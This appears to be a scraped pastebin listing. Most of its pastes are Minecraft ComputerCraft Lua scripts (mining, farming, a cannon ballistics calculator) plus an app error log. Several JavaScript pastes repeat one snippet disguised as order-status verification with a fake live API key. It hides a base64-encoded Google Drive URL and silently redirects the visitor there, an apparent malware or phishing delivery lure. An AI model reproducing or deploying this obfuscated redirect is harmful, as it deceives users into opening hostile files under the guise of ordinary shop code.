        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VcF1HvYQ,mina25.lua,RobinJut,Lua,Thursday 10th of April 2025 01:42:52 PM CDT,"-- Tamaño del área a minar
local width = 25
local length = 25
local height = 3

local progressFile = ""progress.txt""

-- Obtener progreso guardado
function loadProgress()
    if fs.exists(progressFile) then
        local file = fs.open(progressFile, ""r"")
        local data = textutils.unserialize(file.readAll())
        file.close()
        return data.x, data.z
    end
    return 1, 1
end

-- Guardar progreso actual
function saveProgress(x, z)
    local file = fs.open(progressFile, ""w"")
    file.write(textutils.serialize({x = x, z = z}))
    file.close()
end

-- Verificar y recargar combustible si es necesario
function checkFuel()
    while turtle.getFuelLevel() < 100 do
        for i = 1, 16 do
            turtle.select(i)
            if turtle.refuel(0) then
                turtle.refuel()
            end
        end

        if turtle.getFuelLevel() < 100 then
            print(""Pon carburante crack"")
            os.sleep(10)
        end
    end
end

-- Minar la columna 3x1 (frente, arriba y abajo)
function mineColumn()
    turtle.digDown()
    turtle.dig()
    turtle.digUp()
end

-- Mover hacia adelante asegurando cavado
function smartForward()
    while not turtle.forward() do
        turtle.dig()
    end
end

-- Volver al inicio de la fila siguiente (zigzag)
function turnToNextRow(z)
    if z % 2 == 1 then
        turtle.turnRight()
        smartForward()
        turtle.turnRight()
    else
        turtle.turnLeft()
        smartForward()
        turtle.turnLeft()
    end
end

-- Volver al inicio si se detuvo
function returnToStart(x, z)
    local facingEast = (z % 2 == 1)
    if not facingEast then
        turtle.turnLeft()
        turtle.turnLeft()
    end
    for i = 1, x - 1 do
        smartForward()
    end
    turtle.turnRight()
    for i = 1, z - 1 do
        smartForward()
    end
    turtle.turnLeft()
end

-- Main loop
function mineArea()
    local startX, startZ = loadProgress()
    returnToStart(startX, startZ)

    for z = startZ, length do
        for x = startX, width do
            checkFuel()
            mineColumn()
            if x < width then
                smartForward()
            end
            saveProgress(x, z)
        end

        if z < length then
            turnToNextRow(z)
        end

        startX = 1 -- Para nuevas filas, empezar desde el inicio
    end

    print(""Minería completada."")
    fs.delete(progressFile)
end

mineArea()
"
CrY5n5bB,2025-04-10T21:42:01.337,powerampache,PHP,Thursday 10th of April 2025 01:42:02 PM CDT,"1.00-72-BETA (74) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.0.101 (port 47168) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.0.101 (port 47168) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to ampache.nickroc.ru/85.21.144.182 (port 443) from /192.168.0.101 (port 47168) after 15000ms: isConnected failed: ETIMEDOUT (Connection timed out)\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
mxX1X0aR,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 01:41:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13070/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xSrGpMMP,Idk,Berfuglol,Lua,Thursday 10th of April 2025 01:36:09 PM CDT,"-- Import necessary libraries
print(""Create Mod Big Cannons Ballistics Calculator Ultimate! Booting"")
math = require(""math"") -- DTB
 
-- Define the side of the computer where the bundled cable is connected
local bundledSide = ""bottom"" -- Adjust this as needed
 
-- Define color variables in a table for dynamic access
local chargeColors = {
    Charge1 = colors.lightBlue,
    Charge2 = colors.magenta,
    Charge3 = colors.orange,
    Charge4 = colors.white,
    Shell = colors.yellow,
}
local componentColors = {
    GunBreachGearShift = colors.lime,
    GunLoadingPole = colors.brown,
    GunPitchClutch = colors.cyan,
    GunYawClutch = colors.purple, 
    GunYawGearShift = colors.blue,
    GunBuild = colors.gray,
    GunAlarm = colors.black,
    GunFire = colors.green,
}
 
-- Initialize variables for the chat system and the UUIDs
local chatBox = peripheral.find(""chatBox"")
if not chatBox then
    error(""ChatBox peripheral not found."")
end
 
local authorizedUUIDs = {
    ""uuid1"",
    ""76364a85-1e9c-48df-975c-11eb045d5a51"",
    -- Add more authorized UUIDs here
}
 
-- Function to check if a UUID is authorized
local function isAuthorized(uuid)
    for _, authorizedUUID in ipairs(authorizedUUIDs) do
        if uuid == authorizedUUID then
            return true
        end
    end
    return false
end
 
-- Function to power on a specific color (activate a component)
local function PowerOn(componentColor)
    if not componentColor then
        print(""Error: Invalid color provided to PowerOn."")
        return
    end
    local currentOutput = redstone.getBundledOutput(bundledSide) or 0
    redstone.setBundledOutput(bundledSide, bit.bor(currentOutput, componentColor))
    print(""Powered on color: "" .. tostring(componentColor))
end
 
-- Function to power off a specific color (deactivate a component)
local function PowerOff(componentColor)
    if not componentColor then
        print(""Error: Invalid color provided to PowerOff."")
        return
    end
    local currentOutput = redstone.getBundledOutput(bundledSide) or 0
    redstone.setBundledOutput(bundledSide, bit.band(currentOutput, bit.bnot(componentColor)))
    print(""Powered off color: "" .. tostring(componentColor))
end
 
-- Function to reset all outputs
local function ResetOutputs()
    redstone.setBundledOutput(bundledSide, 0)
    print(""All outputs reset."")
end
 
-- Variables to store cannon data and pending fire mission
local Cannon = {}
local pendingFireSolution = nil
local RotationConstant = 2.6695 / 10
 
-- Function to send a denial message with red brackets
local function sendDeniedMessage(username)
    chatBox.sendMessageToPlayer(""You are not authorized to perform this action."", username, ""Denied"", ""[]"", ""&c"")
end
 
-- Function to send success message with green brackets
local function sendAcceptedMessage(username, message)
    chatBox.sendMessageToPlayer(message, username, ""Accepted"", ""[]"", ""&a"")
end
 
-- Function to send informational message with blue brackets
local function sendInfoMessage(username, message)
    chatBox.sendMessageToPlayer(message, username, ""Info"", ""[]"", ""&b"")
end
 
-- Function to save cannon data to a file
local function SaveCannonData()
    local file = fs.open(""cannon_data.txt"", ""w"")
    if file == nil then
        print(""Error opening file for writing."")
        return
    end
    file.writeLine(Cannon.x)
    file.writeLine(Cannon.y)
    file.writeLine(Cannon.z)
    file.writeLine(Cannon.yaw)
    file.writeLine(Cannon.maxCharges)
    file.close()
    print(""Cannon data saved."")
end
 
-- Function to load cannon data from a file
local function LoadCannonData()
    local file = fs.open(""cannon_data.txt"", ""r"")
    if file == nil then
        print(""No cannon data found."")
        return false -- Indicate that data was not loaded
    end
    Cannon.x = tonumber(file.readLine())
    Cannon.y = tonumber(file.readLine())
    Cannon.z = tonumber(file.readLine())
    Cannon.yaw = tonumber(file.readLine())
    Cannon.maxCharges = tonumber(file.readLine())
    file.close()
    print(""Cannon data loaded."")
    return true -- Indicate that data was loaded successfully
end
 
-- Function to prompt the user for cannon info via console
local function PromptForCannonInfo()
    print(""No cannon data found. Please enter cannon information."")
    print(""Input Barrel X: "")
    Cannon.x = tonumber(io.read())
    print(""Input Barrel Y: "")
    Cannon.y = tonumber(io.read())
    print(""Input Barrel Z: "")
    Cannon.z = tonumber(io.read())
    print(""Facing Yaw? (-180 to 180): "")
    Cannon.yaw = tonumber(io.read())
    print(""Max Charges?: "")
    Cannon.maxCharges = tonumber(io.read())
    SaveCannonData()
    print(""Cannon information saved."")
end
 
-- Function to set cannon information via chat command
local function SetCannonInfo(username, params)
    local x, y, z, yaw, maxCharges = params:match(""^(%-?%d+) (%-?%d+) (%-?%d+) (%-?%d+) (%d+)$"")
    if x and y and z and yaw and maxCharges then
        Cannon.x = tonumber(x)
        Cannon.y = tonumber(y)
        Cannon.z = tonumber(z)
        Cannon.yaw = tonumber(yaw)
        Cannon.maxCharges = tonumber(maxCharges)
        SaveCannonData()
        sendAcceptedMessage(username, ""Cannon information updated."")
    else
        sendInfoMessage(username, ""Invalid format. Use: <SetCannon> x y z yaw maxCharges"")
    end
end
 
-- Define the maximum acceptable distance error
local MaxDistanceError = 70 -- Adjust this value as needed
 
-- Function to calculate the pitch angle and charge count
local function CalculatePitch(maxCharges, Distance, TargetY)
    local overallBestCharge = nil
    local overallBestAngle = nil
    local overallBestDistanceError = math.huge
 
    for ChargeCount = maxCharges, 2, -1 do  -- Minimum charge count is now 2
        local bestAngle = nil
        local bestDistanceError = math.huge
 
        for angle = 10, 60, 0.1 do
            local height = Cannon.y + 0.01
            local muzzle_velocity = 40 * ChargeCount
            local rad_angle = math.rad(angle)
            local horizontal_velocity = muzzle_velocity * math.cos(rad_angle)
            local vertical_velocity = muzzle_velocity * math.sin(rad_angle)
            local time = 0
            local range = 0
 
            while height > TargetY or vertical_velocity > 0 do
                time = time + 0.05
                vertical_velocity = vertical_velocity - 23 * 0.05
                range = range + horizontal_velocity * 0.05
                horizontal_velocity = horizontal_velocity * 0.99
                height = height + vertical_velocity * 0.05
            end
 
            local distanceError = math.abs(range - Distance)
 
            if distanceError < bestDistanceError then
                bestDistanceError = distanceError
                bestAngle = angle
            end
        end
 
        -- Check if this is the best overall solution
        if bestDistanceError < overallBestDistanceError then
            overallBestDistanceError = bestDistanceError
            overallBestAngle = bestAngle
            overallBestCharge = ChargeCount
        end
 
        -- If the distance error is acceptable, return immediately
        if bestDistanceError <= MaxDistanceError then
            return ChargeCount, bestAngle, bestDistanceError
        end
    end
 
    -- After trying all charges, return nil if no acceptable solution found
    return nil, nil, nil
end
 
local function normalizeAngle(angle)
    angle = angle % 360
    if angle > 180 then
        angle = angle - 360
    end
    return angle
end
 
-- Function to handle the fire solution calculation
-- Function to handle the fire solution calculation
local function FireSolution(Target)
    -- Ensure Cannon data is loaded
    if not Cannon.x or not Cannon.y or not Cannon.z then
        return false, ""Cannon data not loaded. Please set cannon info using <SetCannon> command.""
    end
 
    -- Calculate Distance
    local Distance = math.sqrt((Target.x - Cannon.x)^2 + (Target.z - Cannon.z)^2)
 
    -- Call CalculatePitch()
    local ChargeCount, ClosestAngle, ClosestDistance = CalculatePitch(Cannon.maxCharges, Distance, Target.y)
 
    if ChargeCount then
        local rawYaw = math.deg(math.atan2(Target.z - Cannon.z, Target.x - Cannon.x)) - Cannon.yaw - 90
        local Yaw = normalizeAngle(rawYaw)
        local RotationTimeAngle = ClosestAngle * RotationConstant
        local YawTime = math.abs(Yaw * RotationConstant)
 
        local fireSolutionMessage = string.format(
            ""Fire Solution:\nAccuracy range: ±%.2f blocks\nCharge Count: %d\nYaw: %.2f degrees\nAngle: %.2f degrees\nType 'confirm' to proceed with firing."",
            ClosestDistance, ChargeCount, Yaw, ClosestAngle
        )
 
        -- Return success, message, and necessary data
        return true, fireSolutionMessage, {
            ChargeCount = ChargeCount,
            ClosestAngle = ClosestAngle,
            ClosestDistance = ClosestDistance,
            Yaw = Yaw,
            RotationTimeAngle = math.abs(ClosestAngle * RotationConstant),
            YawTime = math.abs(Yaw * RotationConstant),
            Target = Target,
            username = pendingFireSolution and pendingFireSolution.username or nil,
        }
    else
        return false, ""No Fire Solution possible within acceptable error margin for coordinates X="" .. Target.x .. "", Y="" .. Target.y .. "", Z="" .. Target.z
    end
end
 
 
-- Function to load the required number of charges
local function func_load_shells_mission(shells)
    if shells < 2 or shells > 4 then  -- Minimum shells is now 2
        print(""Error: Number of shells must be between 2 and 4."")
        return
    end
 
    -- Activate the required charges
    for i = 1, shells do
        local chargeName = ""Charge"" .. i
        local chargeColor = chargeColors[chargeName] -- Access from the table
        if chargeColor then
            PowerOn(chargeColor)
        else
            print(""Error: "" .. chargeName .. "" not defined."")
        end
    end
    PowerOn(chargeColors[""Shell""])
 
    -- Wait for 2 seconds
    sleep(2)
 
    -- Deactivate all charges
    for i = 1, shells do
        local chargeName = ""Charge"" .. i
        local chargeColor = chargeColors[chargeName]
        if chargeColor then
            PowerOff(chargeColor)
        else
            print(""Error: "" .. chargeName .. "" not defined."")
        end
    end
    PowerOff(chargeColors[""Shell""])
    sleep(13)
end
 
-- Function to execute the fire mission
local function ExecuteFireMission(fireMissionData)
    -- Extract data
    local ChargeCount = fireMissionData.ChargeCount
    local ClosestAngle = fireMissionData.ClosestAngle
    local Yaw = fireMissionData.Yaw
    local RotationTimeAngle = fireMissionData.RotationTimeAngle
    local YawTime = fireMissionData.YawTime
    local Target = fireMissionData.Target
    local username = fireMissionData.username
 
    -- Reset outputs
    ResetOutputs()
    PowerOff(componentColors.GunBuild)
 
    -- Load the required number of charges
    print(""Loading "" .. ChargeCount .. "" charges..."")
    sendAcceptedMessage(username, ""Starting Fire Mission with "" .. ChargeCount .. "" charges."")
    func_load_shells_mission(ChargeCount)
    sendAcceptedMessage(username, ChargeCount .. "" charges loaded."")
 
    -- Prepare for firing
    PowerOn(componentColors.GunBuild)
    sleep(0.5)
 
    -- Handle Yaw Direction
    if Yaw < 0 then
        PowerOn(componentColors.GunYawGearShift) -- Set direction for negative Yaw
    else
        PowerOff(componentColors.GunYawGearShift) -- Set direction for positive Yaw
    end
 
    -- Start moving both Pitch and Yaw
    print(""Aiming Cannon Pitch and Yaw simultaneously..."")
    local pitchActive = true
    local yawActive = true
    local elapsedTime = 0
    local timeStep = 0.1 -- Time increment for the loop
 
    -- Turn on both motors if movement is needed
    if RotationTimeAngle > 0 then
        PowerOn(componentColors.GunPitchClutch)
    else
        pitchActive = false -- No movement needed
    end
 
    if YawTime > 0 then
        PowerOn(componentColors.GunYawClutch)
    else
        yawActive = false -- No movement needed
    end
 
    -- Timer loop
    while pitchActive or yawActive do
        sleep(timeStep)
        elapsedTime = elapsedTime + timeStep
 
        -- Check Pitch
        if pitchActive and elapsedTime >= RotationTimeAngle then
            PowerOff(componentColors.GunPitchClutch)
            pitchActive = false
            print(""Pitch adjustment complete."")
        end
 
        -- Check Yaw
        if yawActive and elapsedTime >= YawTime then
            PowerOff(componentColors.GunYawClutch)
            yawActive = false
            print(""Yaw adjustment complete."")
        end
    end
 
    -- Fire the cannon
    print(""Firing Cannon..."")
    PowerOn(componentColors.GunAlarm)
    sleep(1)
    PowerOn(componentColors.GunFire)
    sleep(1)
    PowerOff(componentColors.GunFire)
    PowerOff(componentColors.GunAlarm)
    PowerOff(componentColors.GunBuild)
    print(""Fire mission complete."")
    sendAcceptedMessage(username, ""Fire Mission Complete."")
end
 
 
-- Attempt to load cannon data
local dataLoaded = LoadCannonData()
 
-- If data not loaded, prompt the user for cannon info
if not dataLoaded then
    PromptForCannonInfo()
end
 
-- Main event loop for chat handling
while true do
    local event, username, message, uuid, isHidden = os.pullEvent(""chat"")
    print(""Chat event from "" .. username .. "": "" .. message)
 
    -- Check if the message is a command
    if message == ""<GetMyUUID>"" then
        -- Respond with the user's UUID
        sendInfoMessage(username, ""Your UUID is: "" .. uuid)
    elseif message:match(""^<[%a]+>"") then
        -- This is a command, check authorization
        if isAuthorized(uuid) then
            local x, y, z = message:match(""^<FireSolution> (%-?%d+) (%-?%d+) (%-?%d+)"")
            if x and y and z then
                -- Handle FireSolution command
                local Target = { x = tonumber(x), y = tonumber(y), z = tonumber(z) }
                local success, fireSolutionMessage, fireMissionData = FireSolution(Target)
                if success then
                    -- Send the fire solution to the user via chat
                    sendInfoMessage(username, fireSolutionMessage)
                    -- Set pending fire solution
                    pendingFireSolution = {
                        username = username,
                        data = fireMissionData,
                    }
                else
                    -- Send failure message
                    sendInfoMessage(username, fireSolutionMessage)
                    pendingFireSolution = nil
                end
            else
                sendInfoMessage(username, ""Unknown command or invalid format."")
            end
        else
            -- Handle unauthorized access
            sendDeniedMessage(username)
        end
    elseif pendingFireSolution and username == pendingFireSolution.username then
        if message:lower() == ""confirm"" then
            -- Proceed with firing
            sendAcceptedMessage(username, ""Firing mission proceeding."")
            pendingFireSolution.data.username = username -- Pass the username to the execution function
            ExecuteFireMission(pendingFireSolution.data)
            pendingFireSolution = nil
        elseif message:lower() == ""cancel"" then
            sendInfoMessage(username, ""Fire mission canceled."")
            pendingFireSolution = nil
        else
            sendInfoMessage(username, ""Please type 'confirm' to proceed or 'cancel' to abort."")
        end
    else
        -- Normal chat message
        print(""Normal chat message: "" .. message)
    end
end"
kBArTuh5,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 01:26:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51719/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
esQHhAg7,Products.js,luqlegal,JavaScript,Thursday 10th of April 2025 01:10:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09698/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6JvB7WuC,Order.js,luqlegal,JavaScript,Thursday 10th of April 2025 12:55:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40608/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VCmGkTaL,farm.lua,RobinJut,Lua,Thursday 10th of April 2025 12:55:03 PM CDT,"-- Turtle farm by JackMacWindows
--
-- This is a simple farming script for ComputerCraft turtles. To use, simply
-- place a tilling turtle on top of a farming region, place a wired modem
-- connected to a chest next to the turtle, and run this script.
--
-- Features:
-- * Fully automatic field tending
-- * Automatic tilling and planting to reduce setup time
-- * Zero configuration to start a basic farm
-- * Boundaries are automatically detected, so no need to calculate size
-- * Non-rectangular and non-flat fields supported
-- * Recovery after being unloaded
-- * Automatic unloading and refueling from one or more chests
--
-- To create a farm, create a complete boundary around the dirt or grass area
-- that you want the farm to be inside. Then add water to ensure the field stays
-- fully watered. The field may be any height - the turtle will automatically
-- move up or down to continue farming. The field may also be non-rectangular,
-- but it will not detect single holes in a straight line going across the field.
-- (e.g. if a boundary is at (100, 0) to (100, 100), the boundary may not have a
-- hole taken out at (100, 25) to (100, 50).)
--
-- The turtle dispenses items when it reaches the origin point, which is the
-- place where the turtle was when the farm was started. This point must have a
-- modem next to it, with one or more chests placed next to that modem. The
-- program will prompt you to set this up if not present. (Make sure to right-
-- click the modem to turn it red and enable it.) Whenever the turtle returns to
-- this point, it will dispense all items except one stack of seeds and one stack
-- of fuel. If either of these stacks are not present, it will pick them up from
-- the chests.
--
-- Farms may have multiple different types of crops, and the turtle will attempt
-- to replace them with the same type of seed. However, these will have to be
-- planted beforehand - when planting the first crops, it will use whatever
-- seeds are found in the chest or turtle first.
--
-- If you'd like to add custom modded crops, scroll down to the ""add your own
-- here"" sections, and fill out the templates for the blocks and items you want.
--
-- If you need any help, you may ask on the ComputerCraft Discord server at
-- https://discord.computercraft.cc.

-- MIT License
--
-- Copyright (c) 2022 JackMacWindows
--
-- Permission is hereby granted, free of charge, to any person obtaining a copy
-- of this software and associated documentation files (the ""Software""), to deal
-- in the Software without restriction, including without limitation the rights
-- to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-- copies of the Software, and to permit persons to whom the Software is
-- furnished to do so, subject to the following conditions:
--
-- The above copyright notice and this permission notice shall be included in all
-- copies or substantial portions of the Software.
--
-- THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-- AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-- OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-- SOFTWARE.

local x, y, z = 0, 0, 0
local direction = 0
local invertDirection = false

-- Ground blocks that are part of the farm
local groundBlocks = {
    [""minecraft:dirt""] = true,
    [""minecraft:grass_block""] = true,
    [""minecraft:farmland""] = true,
    [""minecraft:water""] = true,
    [""minecraft:flowing_water""] = true,
    -- add your own here:
    --[""<yourmod>:<block>""] = true,
}

-- Blocks that are crops, with their maximum ages
local cropBlocks = {
    [""minecraft:wheat""] = 7,
    [""minecraft:carrots""] = 7,
    [""minecraft:potatoes""] = 7,
    [""minecraft:beetroots""] = 3,
    -- add your own here:
    --[""<yourmod>:<block>""] = <maximum age>,
}

-- Mappings of crop blocks to seed items
local seeds = {
    [""minecraft:wheat""] = ""minecraft:wheat_seeds"",
    [""minecraft:carrots""] = ""minecraft:carrot"",
    [""minecraft:potatoes""] = ""minecraft:potato"",
    [""minecraft:beetroots""] = ""minecraft:beetroot_seeds"",
    -- add your own here:
    --[""<yourmod>:<block>""] = ""<yourmod>:<seed>"",
}

-- Fuel types to pull from a chest if no fuel is in the inventory
local fuels = {
    [""minecraft:coal""] = true,
    [""minecraft:charcoal""] = true,
    [""minecraft:lava_bucket""] = true,
    -- add your own here:
    --[""<yourmod>:<item>""] = true,
}

local seedItems = {}
for k, v in pairs(seeds) do seedItems[v] = k end

local function writePos()
    local file = fs.open(""jackmacwindows.farm-state.txt"", ""w"")
    file.writeLine(x)
    file.writeLine(y)
    file.writeLine(z)
    file.writeLine(direction)
    file.writeLine(invertDirection and ""true"" or ""false"")
    file.close()
end

local function refuel()
    if turtle.getFuelLevel() == ""unlimited"" or turtle.getFuelLevel() == turtle.getFuelLimit() then return end
    for i = 1, 16 do
        if turtle.getItemCount(i) > 0 then
            turtle.select(i)
            turtle.refuel(turtle.getItemCount() - 0)
            if turtle.getFuelLevel() == turtle.getFuelLimit() then return true end
        end
    end
    if turtle.getFuelLevel() > 0 then return true
    else return false, ""Out of fuel""..turtle.getFuelLevel() end
end

local function forward()
    local ok, err = turtle.forward()
    if ok then
        if direction == 0 then x = x + 1
        elseif direction == 1 then z = z + 1
        elseif direction == 2 then x = x - 1
        else z = z - 1 end
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function back()
    local ok, err = turtle.back()
    if ok then
        if direction == 0 then x = x - 1
        elseif direction == 1 then z = z - 1
        elseif direction == 2 then x = x + 1
        else z = z + 1 end
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function up()
    local ok, err = turtle.up()
    if ok then
        y = y + 1
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function down()
    local ok, err = turtle.down()
    if ok then
        y = y - 1
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function left()
    local ok, err = turtle.turnLeft()
    if ok then
        direction = (direction - 1) % 4
        writePos()
        return true
    else return false, err end
end

local function right()
    local ok, err = turtle.turnRight()
    if ok then
        direction = (direction + 1) % 4
        writePos()
        return true
    else return false, err end
end

local function panic(msg)
    term.clear()
    term.setCursorPos(1, 1)
    term.setTextColor(colors.red)
    print(""An unrecoverable error occured while farming:"", msg, ""\nPlease hold Ctrl+T to stop the program, then solve the issue described above, run 'rm jackmacwindows.farm-state.txt', and return the turtle to the start position. Don't forget to label the turtle before breaking it."")
    if peripheral.find(""modem"") then
        peripheral.find(""modem"", rednet.open)
        rednet.broadcast(msg, ""jackmacwindows.farming-error"")
    end
    local speaker = peripheral.find(""speaker"")
    if speaker then
        while true do
            speaker.playNote(""bit"", 3, 12)
            sleep(1)
        end
    else while true do os.pullEvent() end end
end

local function check(ok, msg) if not ok then panic(msg) end end

local function tryForward()
    local ok, err, found, block
    repeat
        found, block = turtle.inspect()
        if found then
            if groundBlocks[block.name] or cropBlocks[block.name] then
                ok, err = up()
                if not ok then return ok, err end
            else return false, ""Out of bounds"" end
        end
    until not found
    ok, err = forward()
    if not ok then return ok, err end
    local lastY = y
    repeat
        found, block = turtle.inspectDown()
        if not found then
            ok, err = down()
            if not ok then return ok, err end
        end
    until found
    if groundBlocks[block.name] then
        ok, err = up()
        if not ok then return ok, err end
        turtle.digDown()
    elseif not cropBlocks[block.name] then
        while y < lastY do
            ok, err = up()
            if not ok then return ok, err end
        end
        ok, err = back()
        if not ok then return ok, err end
        return false, ""Out of bounds""
    end
    return true
end

local function selectItem(item)
    local lut = {}
    if type(item) == ""table"" then
        if item[1] then for _, v in ipairs(item) do lut[v] = true end
        else lut = item end
    else lut[item] = true end
    local lastEmpty
    for i = 1, 16 do
        local info = turtle.getItemDetail(i)
        if info and lut[info.name] then
            turtle.select(i)
            return true, i
        elseif not info and not lastEmpty then lastEmpty = i end
    end
    return false, lastEmpty
end

local function handleCrop()
    local found, block = turtle.inspectDown()
    if not found then
        if selectItem(seedItems) then turtle.placeDown() end
    elseif block.state.age == cropBlocks[block.name] then
        local seed = seeds[block.name]
        turtle.select(1)
        turtle.digDown()
        turtle.suckDown()
        if turtle.getItemDetail().name ~= seed and not selectItem(seed) then return end
        turtle.placeDown()
    end
end

local function exchangeItems()
    local inventory, fuel, seed = {}, nil, nil
    for i = 1, 16 do
        turtle.select(i)
        local item = turtle.getItemDetail(i)
        if item then
